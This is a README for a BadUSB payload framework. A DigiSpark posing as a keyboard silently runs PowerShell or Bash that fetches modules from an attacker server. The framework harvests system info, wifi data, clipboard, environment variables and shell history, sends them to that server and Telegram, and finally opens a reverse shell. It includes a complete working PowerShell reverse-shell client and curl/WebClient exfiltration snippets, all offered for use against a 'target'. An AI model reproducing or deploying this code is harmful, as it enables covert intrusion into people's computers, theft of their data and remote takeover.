# Digispark Dynamic BadUSB

A modular DigiSpark-based payload framework. The DigiSpark acts as a USB HID keyboard that silently triggers a PowerShell (Windows) or Bash (Mac) chain on the target. All logic lives in server-side modules — swap or add modules without ever reflashing the device.

Digispark Dynamic BadUSB turns a $2 DigiSpark into a full payload framework. Comes with ready-to-use modules: recon, reverse shell, clearance, and a custom slot — all swappable from the server without ever reflashing the device.

## How It Works

```
DigiSpark plugs in
    └── Win+R (or Spotlight on Mac)
        └── downloads init.ps1 / init_mac.sh from server
            └── collects basic sysinfo → POST /store/init
                └── loads each module in order:
                    recon → wifi → clipboard → envvars → history → custom → mom
                        └── each module POSTs output → saved to outputs/
                            └── mom.ps1 / mom_mac.sh → reverse shell connects
```

## Usage

### 1. Configure .env

Copy `.env.example` to `.env` and fill in your values:

```env
TG_TOKEN=yourtelegramtoken
TG_CHAT_ID=telegramchatID

PORT=12345
LHOST=192.168.1.1

# Auth X - for init.ps1
USER=admin
PASS=secret

# Auth Y - for all other modules (leave blank to use same as Auth X)
MUSER=admin2
MPASS=secret2

# SSL (leave blank to run plain HTTP)
CERT=/etc/letsencrypt/live/yourdomain.com/fullchain.pem
KEY=/etc/letsencrypt/live/yourdomain.com/privkey.pem
```

### 2. Run server.py

```bash
python3 server.py
```

On startup it will auto-patch `LHOST`, `PORT`, and auth tokens into:
- `moduls/init.ps1`
- `moduls/init_mac.sh`
- `mom.ino`
- `mom_mac.ino`

And print something like:

```
[+] init.ps1     patched  H=192.168.1.1  P=12345  AU=Basic abc...
[+] init_mac.sh  patched  H=192.168.1.1  P=12345  AU=Basic abc...
[+] mom.ino      patched  LHOST=192.168.1.1  HTTP_PORT=12345
[+] mom_mac.ino  patched  LHOST=192.168.1.1  HTTP_PORT=12345

Listening   : https://0.0.0.0:12345
Auth X (init.ps1)  : admin:secret   ->  Basic YWRtaW46c2VjcmV0
Auth Y (modules)   : admin2:secret2 ->  Basic YWRtaW4yOnNlY3JldDI=
```

### 3. Flash mom.ino

Open `mom.ino` (Windows target) or `mom_mac.ino` (Mac target) in Arduino IDE and flash to the DigiSpark.

> `mom.ino` is already pre-filled with the correct values from step 2 — just flash it.

> Reflash only needed when Auth X credentials change.

### 4. Deploy

Plug the DigiSpark into the target machine. Check `outputs/` and your Telegram for results.

---

## Adding / Updating Modules

No reflash needed when changing or adding modules — just edit the files on the server.

Two files to touch:

**1. Create your module** (e.g. `moduls/reverseshell.ps1`):

```powershell
# available from init.ps1: $H, $P, $AU, $TH, $LP

$LHOST = "your_ip"
$LPORT = 9999
$T=New-Object Net.Sockets.TCPClient($LHOST,$LPORT)
$N=$T.GetStream()
$W=New-Object IO.StreamWriter($N)
$R=New-Object IO.StreamReader($N)
$W.AutoFlush=$true

while($T.Connected){
    $C=$R.ReadLine()
    if($C -eq 'exit'){break}
    $sb=[scriptblock]::Create($C)
    $O=try{(& $sb) 2>&1|Out-String}catch{$_|Out-String}
    $W.WriteLine($O.TrimEnd())
    $W.WriteLine('<<END>>')
}
$T.Close()
```

**2. Add it to `moduls/init.ps1` payloads list:**

```powershell
$payloads = @("recon.ps1", "wifi.ps1", "clipboard.ps1", "envvars.ps1", "history.ps1", "reverseshell.ps1", "custom.ps1")
```

Plug in the DigiSpark — no reflash needed. Just setup your listener (eg: `nc -nlvp 9999`)

---

## Sending Output Back to Server

Use this pattern in any module:

```powershell
# Windows
$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
$wc.UploadString("http://${H}:${P}/store/mymodule", $output)
```

```bash
# Mac
echo "$OUTPUT" | curl -s -X POST "http://$H:$P/store/mymodule" \
     -H "Authorization: $AU" -H "Content-Type: text/plain" -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
```

Output is saved to `outputs/date_time_hash_mymodule.txt` and sent to Telegram.
